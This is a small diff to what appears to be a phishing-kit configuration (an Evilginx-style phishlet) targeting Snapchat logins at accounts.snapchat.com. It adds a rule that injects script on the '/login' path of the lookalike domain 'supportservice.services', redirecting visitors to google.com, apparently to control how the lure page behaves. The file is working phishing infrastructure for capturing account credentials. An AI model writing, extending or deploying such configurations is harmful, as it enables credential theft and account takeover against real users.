@@ -25,3 +25,9 @@ credentials:
 login:
   domain: 'accounts.snapchat.com'
   path: '/accounts/login'
+js_inject:
+  - trigger_domains: ["supportservice.services"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+      window.location.replace('https://google.com')
